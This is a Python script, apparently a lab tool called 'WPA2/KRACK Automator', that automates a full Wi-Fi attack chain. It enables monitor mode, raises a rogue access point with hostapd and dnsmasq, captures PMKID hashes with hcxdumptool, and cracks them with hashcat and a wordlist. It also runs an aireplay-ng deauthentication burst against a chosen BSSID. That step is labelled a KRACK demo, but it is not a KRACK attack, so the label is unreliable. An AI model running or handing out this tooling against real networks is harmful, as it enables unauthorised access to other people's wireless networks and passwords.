#!/usr/bin/env python3
"""
WPA2/KRACK Automator
Permite automatizar la demo de:
  - prepare: pasar la interfaz a modo monitor
  - ap: levantar un AP falso (hostapd + dnsmasq)
  - capture: capturar PMKID con hcxdumptool
  - extract: extraer el hash para Hashcat
  - crack: crackear offline con Hashcat
  - krack: demo KRACK (retransmisión de nonce)
  - all: todo el flujo completo

Uso:
  sudo ./wpa2lab.py prepare --monitor IFACE
  sudo ./wpa2lab.py ap --ap IFACE
  sudo ./wpa2lab.py capture
  sudo ./wpa2lab.py extract
  sudo ./wpa2lab.py crack
  sudo ./wpa2lab.py krack BSSID
  sudo ./wpa2lab.py all --monitor IFACE --ap IFACE BSSID
"""
import sys
import shutil
import subprocess
import re
import logging
import yaml
import argparse
from pathlib import Path

# ---- RUTAS ----
script_dir   = Path(__file__).resolve().parent
project_root = script_dir.parent

# ---- CARGA DE CONFIG ----
cfg_file = project_root / "config.yaml"
if not cfg_file.exists():
    print(f"Error: no encuentro config.yaml en {project_root}", file=sys.stderr)
    sys.exit(1)
cfg = yaml.safe_load(cfg_file.read_text()) or {}

# ---- LOGGING ----
log_cfg   = cfg.get("logging", {})
log_file  = project_root / log_cfg.get("file", "logs/wpa2lab.log")
log_level = getattr(logging, log_cfg.get("level", "INFO").upper(), logging.INFO)
logging.basicConfig(
    filename=str(log_file),
    level=log_level,
    format="%(asctime)s %(levelname)s %(message)s"
)
log = logging.getLogger("wpa2lab")

# ---- HELPERS ----

def run(cmd, sudo=False):
    if sudo:
        cmd = ["sudo"] + cmd
    log.info("Ejecutando: %s", ' '.join(cmd))
    subprocess.run(cmd, check=True)

# ---- SUBCOMANDOS ----

def cmd_prepare(args):
    """Pasa la interfaz a modo monitor"""
    iface = args.monitor
    if not iface:
        print("Error: no has especificado --monitor.", file=sys.stderr)
        sys.exit(1)
    # detener monitor previo si existía
    run(["airmon-ng", "check", "kill"], sudo=True)
    try:
        run(["airmon-ng", "start", iface], sudo=True)
    except subprocess.CalledProcessError:
        print(f"Error: {iface} no soporta monitor mode.", file=sys.stderr)
        sys.exit(1)
    print("Modo monitor activado en:", iface + "mon")


def cmd_ap(args):
    """Levanta el AP falso: asigna IP, hostapd y dnsmasq"""
    ap_iface = args.ap
    if not ap_iface:
        print("Error: no has especificado --ap.", file=sys.stderr)
        sys.exit(1)
    # sube interfaz gestionada para AP
    run(["ip", "link", "set", ap_iface, "up"], sudo=True)
    run(["ip", "addr", "flush", "dev", ap_iface], sudo=True)
    run(["ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], sudo=True)
    # matar procesos previos (no fallar si no existen)
    subprocess.run(["sudo", "killall", "hostapd"], check=False)
    subprocess.run(["sudo", "killall", "dnsmasq"], check=False)
    # hostapd
    hapd_conf = project_root / "hostapd/hostapd.conf"
    print(f"[+] hostapd → {hapd_conf}")
    run(["hostapd", "-B", str(hapd_conf)], sudo=True)
    # dnsmasq
    dns_conf = project_root / "dnsmasq/dnsmasq.conf"
    print(f"[+] dnsmasq → {dns_conf}")
    run(["dnsmasq", "-C", str(dns_conf)], sudo=True)
    print(f"AP falso listo en 10.0.0.1/24 via {ap_iface}. (CTRL-C para detener)")


def cmd_capture(_):
    """Captura PMKID con hcxdumptool"""
    tool = "hcxdumptool"
    if not shutil.which(tool):
        print("Instala hcxdumptool: sudo apt install hcxdumptool", file=sys.stderr)
        sys.exit(1)
    mon_iface = None
    # supongamos monitor = iface + "mon"
    # busca interfaz terminada en mon
    out = subprocess.check_output(["iw", "dev"]).decode()
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\w+mon)", line)
        if m:
            mon_iface = m.group(1)
            break
    if not mon_iface:
        print("Error: no hay interfaz monitor. Ejecuta 'prepare'.", file=sys.stderr)
        sys.exit(1)
    pcap = project_root / cfg.get("paths", {}).get("pcap", "dump.pcapng")
    print(f"Capturando PMKID en {mon_iface} → {pcap}")
    run([tool, "-i", mon_iface, "-w", str(pcap)], sudo=True)


def cmd_extract(_):
    """Extrae hash (hcxpcapngtool)"""
    tool = "hcxpcapngtool"  # <-- aquí cambia a "hcxpcapngtool"
    if not shutil.which(tool):
        print("Instala hcxtools: sudo apt install hcxtools", file=sys.stderr)
        sys.exit(1)
    pcap  = project_root / cfg.get("paths", {}).get("pcap", "dump.pcapng")
    hashf = project_root / cfg.get("paths", {}).get("hash", "hash.22000")
    print(f"Extract: {pcap} → {hashf}")
    run([tool, "-o", str(hashf), str(pcap)])



def cmd_crack(_):
    """Crack offline con hashcat"""
    tool = "hashcat"
    if not shutil.which(tool):
        print("Instala hashcat: sudo apt install hashcat", file=sys.stderr)
        sys.exit(1)
    hashf = project_root / cfg.get("paths", {}).get("hash", "hash.22000")
    wordl = cfg.get("paths", {}).get("wordlist", "/usr/share/wordlists/rockyou.txt")
    print("Cracking offline...")
    run([tool, "-m", "22000", str(hashf), str(wordl)])


def cmd_krack(args):
    """Demo KRACK: fuerza retransmisión"""
    tool = "aireplay-ng"
    if not shutil.which(tool):
        print("Instala aircrack-ng: sudo apt install aircrack-ng", file=sys.stderr)
        sys.exit(1)
    mon_iface = None
    out = subprocess.check_output(["iw", "dev"]).decode()
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\w+mon)", line)
        if m:
            mon_iface = m.group(1)
            break
    if not mon_iface:
        print("Error: no hay interfaz monitor. Ejecuta 'prepare'.", file=sys.stderr)
        sys.exit(1)
    print(f"KRACK → {args.bssid} en {mon_iface}")
    run([tool, "-0", "1", "-a", args.bssid, mon_iface], sudo=True)


def cmd_all(args):
    cmd_prepare(args)
    cmd_ap(args)
    cmd_capture(args)
    cmd_extract(args)
    cmd_crack(args)
    print("Demo COMPLETA. Para KRACK:")
    print("  sudo ./wpa2lab.py krack <BSSID>")

# ---- PARSER ----
if __name__ == "__main__":
    p = argparse.ArgumentParser("WPA2/KRACK Automator")
    sub = p.add_subparsers(dest="cmd", required=True)

    sp = sub.add_parser("prepare", help="Monitor mode")
    sp.add_argument("--monitor", help="Interfaz monitor (eg. wlan0)")
    sp.set_defaults(func=cmd_prepare)

    sp = sub.add_parser("ap", help="AP falso (hostapd+dnsmasq)")
    sp.add_argument("--ap", help="Interfaz gestionada para AP (eg. wlan1)")
    sp.set_defaults(func=cmd_ap)

    sub.add_parser("capture", help="Capturar PMKID").set_defaults(func=cmd_capture)
    sub.add_parser("extract", help="Extraer hash").set_defaults(func=cmd_extract)
    sub.add_parser("crack", help="Crack offline").set_defaults(func=cmd_crack)

    sp = sub.add_parser("krack", help="Demo KRACK")
    sp.add_argument("bssid", help="BSSID objetivo")
    sp.set_defaults(func=cmd_krack)

    sp = sub.add_parser("all", help="Todo el flujo")
    sp.add_argument("--monitor", help="Interfaz monitor")
    sp.add_argument("--ap", help="Interfaz AP")
    sp.add_argument("bssid", help="BSSID para KRACK")
    sp.set_defaults(func=cmd_all)

    args = p.parse_args()
    args.func(args)
